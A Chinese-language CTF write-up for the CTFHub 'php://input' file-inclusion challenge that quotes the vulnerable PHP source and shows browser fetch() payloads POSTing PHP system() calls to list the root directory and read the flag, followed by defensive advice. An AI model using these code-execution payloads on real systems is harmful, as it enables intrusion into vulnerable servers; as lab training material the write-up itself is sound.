---
title: CTFHub 文件包含-php://input
date: 2026-10-22
categories: CTFHub Web 文件包含 php://input伪协议 白名单绕过 F12 控制台发包
tags: CTFHub Web 文件包含 php://input伪协议 白名单绕过 F12 控制台发包
---
# 题目：CTFHub 文件包含-php://input

## 题目描述
打开题目页面，源码如下：
```php
<?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag?<br>
<a href="phpinfo.php">phpinfo</a>
```
*分析：*
代码强制要求 file 参数的前 6 个字符必须是 php://。
这意味着我们不能用 http:// 进行远程包含，也不能直接包含本地文件（如 flag.php 或 phpinfo.php），除非用伪协议。
页面提示没有 shell，我们需要自己造一个。

## 解题思路
### 漏洞原理
既然只能用 php://，那 php://input 就是最好的选择。它可以读取 HTTP POST 请求的原始数据，并把它当作文件内容包含（执行）。
因为源码没有过滤 php://input，我们可以通过 POST 请求把木马代码发过去，让服务器执行。

### 攻击链
构造 POST 请求：?file=php://input。
请求体（Body）写入木马：<?php system("ls /"); ?>。
服务器执行命令，回显根目录文件。
读取 flag。

### 解题步骤
1. 在浏览器控制台发送 POST 请求
由于 CMD 中的 curl 处理特殊字符和空格容易报错，我们直接使用浏览器开发者工具（F12）。
在题目页面按 F12，打开 控制台 (Console)。

粘贴以下代码并回车：
```javascript
fetch('/?file=php://input', {
    method: 'POST',
    body: '<?php system("ls /"); ?>'
}).then(r => r.text()).then(t => console.log(t));
```
返回结果：
```text
bin
boot
...
flag_24673
...
```
（成功执行 ls /，发现根目录下有一个 flag_24673 文件）

2. 读取 Flag
将代码中的 ls / 替换为 cat /flag_24673，继续在控制台执行：
```javascript
fetch('/?file=php://input', {
    method: 'POST',
    body: '<?php system("cat /flag_24673"); ?>'
}).then(r => r.text()).then(t => console.log(t));
```
返回结果：
```text
ctfhub{97f29f53938771ff5a030882}
```
得到 flag.

## 踩坑指南
1. 在 CMD 中使用 curl 报错 Malformed input to a URL function
原因： 命令中包含了空格（如 cat /flag），CMD 的 curl 会将其识别为参数分隔符导致报错。
解决： 使用浏览器 F12 控制台发送 fetch 请求，完美避开空格问题。

2. 误以为 phpinfo.php 里有 flag
原因： 题目给了 phpinfo 的链接，容易让人误以为 flag 藏在环境变量里。
解决： 本题的核心是代码执行，而不是信息泄露。直接利用 php://input 拿 shell 才是正道。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| `php://input` | 读取 POST 请求的原始数据，可执行 PHP 代码 |
| `substr` | 截取字符串，本题用来做白名单限制 |
| `fetch` | 浏览器原生的网络请求函数，适合发包测试 |

### 防御建议
1. 禁用危险伪协议：在 php.ini 中设置 allow_url_include = Off。
2. 严格限制包含路径：不要仅用 substr 做判断，应使用白名单。
3. 过滤敏感字符：对 php:// 等协议进行拦截。
